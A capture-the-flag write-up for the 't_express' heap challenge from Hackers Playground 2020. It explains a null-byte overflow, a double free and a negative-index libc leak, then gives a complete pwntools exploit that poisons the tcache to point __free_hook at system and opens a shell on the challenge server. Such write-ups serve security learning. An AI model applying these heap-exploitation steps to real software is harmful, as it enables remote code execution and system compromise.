# t_express

I played Hackers Playground-2020 with team warlockrootx, and solved one pwn challenge. The challenges were well organized. 

There were three bugs.
1. When reading firstname and lastname. There is Null byte overflow into the `ticket_type` member of the structure.
2. When we free the pass. The program doesn't initialize the varialble which leads to double free.
3. When viewing the chunk. The `index` variable is signed int. And we can give negative index to leak libc from the libc pointers on bss.

exploit->
1. Negative index to leak the libc address.
2. Free the 0x41 sized chunk.
3. Use Null byte overflow. After we can change the size of the freed 0x41 size to 0x21.
4. Free the chunk again.
5. Tcache-posion. `__free_hook` -> `system`.
6. Shell
```
#### Exploit.
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
"""
typedef struct pass {
    char firstname[8];
    char lastname[8];
    long int ticket_type;
    int meal_type;
    int safari_pass;
    long int giftshop_coupon;
    long int ridecount;
}PASS;
"""
####Utils
def buyticket(choice,firstname,lastname):
    io.sendlineafter("choice: ","1")
    io.sendlineafter("(1/2):",str(choice))
    io.sendafter("First name: ",firstname)
    io.sendafter("Last name: ",lastname)

def viewticket(idx):
    io.sendlineafter("choice: ","2")
    io.sendafter("ticket: ",str(idx))
    io.recvuntil("|name |")
    firstname = io.recvn(0x9)
    lastname = io.recvn(0x8)
    return [firstname,lastname]

def useticket(idx,choice=1,ttype=1):
    io.sendlineafter("choice: ","3")
    io.sendafter("ticket: ",str(idx))
    if ttype==0:
        io.sendlineafter("(1/2/3/4): ",str(choice))

####Addr
leak_offset = 0x1ec723
free_hook = 0x1eeb28
system = 0x55410

####Exploit
#io = process("./t")#,env={"LD_PRELOAD":"./libc.so.6"})
io = remote("t-express.sstf.site",1337)
buyticket(1,"/bin/sh\x00","HKHKHKH") #0
buyticket(2,"HKHK","HKHK") #1
buyticket(1,"HKHK","HKHKHKHK")#2
buyticket(2,"HKHK","HKHK") #3
for i in range(3):
    useticket(1,choice=1,ttype=0)
useticket(1,choice=2,ttype=0)
useticket(1,choice=3,ttype=0)
for i in range(3):
    useticket(3,ttype=0)
useticket(3,choice=2,ttype=0)
useticket(3,choice=3,ttype=0)
libc_leak = u64(viewticket(-8)[1][0x2:0x8]+b"\x00\x00")
libc_base = libc_leak-leak_offset
print("Libc base: 0x%x"%libc_base)
for i in range(0x20):
    useticket(2,ttype=0)
useticket(3,choice=4,ttype=0)
buyticket(1,p64(libc_base+free_hook),"HKHK") #4
buyticket(2,"HKHK","HKHK") #5
buyticket(2,p64(libc_base+system),"\x00") #6
useticket(0)
io.interactive()
```
